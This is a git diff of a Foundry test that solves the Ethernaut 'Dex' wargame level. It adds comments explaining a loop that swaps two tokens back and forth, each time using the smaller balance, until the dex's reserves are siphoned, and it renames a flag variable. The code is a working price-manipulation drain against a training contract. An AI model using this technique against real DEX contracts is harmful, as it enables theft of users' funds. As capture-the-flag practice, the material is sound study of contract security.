@@ -46,7 +46,10 @@ contract DexTest is Test {
          * 2) approve the 2 tokens
          * 3) We declare an outside variable to ...
          * 4) We create a while loop that will carry on until token1 is down to 0
-         * 5)
+         * 5) we have a helper function that will return the smaller balance between player && ethernautDex
+         *  Once the loop run for a condition, we switch the flip variable because every time we go in the loop
+         *  A > B   A < B   A > B    A < B ...
+         *  until the amount is 0 and we siphoned the whole dex reserves
          */
 
         // -- 1 --
@@ -64,7 +67,7 @@ contract DexTest is Test {
         );
 
         // -- 3 --
-        bool tick = true;
+        bool flip = true;
 
         // -- 4 --
         while (
@@ -88,7 +91,8 @@ contract DexTest is Test {
             );
             emit log("");
 
-            if (tick) {
+            // -- 5 --
+            if (flip) {
                 uint256 amount = min(
                     ethernautDex.balanceOf(token1Address, player),
                     ethernautDex.balanceOf(
@@ -97,7 +101,7 @@ contract DexTest is Test {
                     )
                 );
                 ethernautDex.swap(token1Address, token2Address, amount);
-                tick = false;
+                flip = false;
             } else {
                 uint256 amount = min(
                     ethernautDex.balanceOf(token2Address, player),
@@ -107,7 +111,7 @@ contract DexTest is Test {
                     )
                 );
                 ethernautDex.swap(token2Address, token1Address, amount);
-                tick = true;
+                flip = true;
             }
         }
 
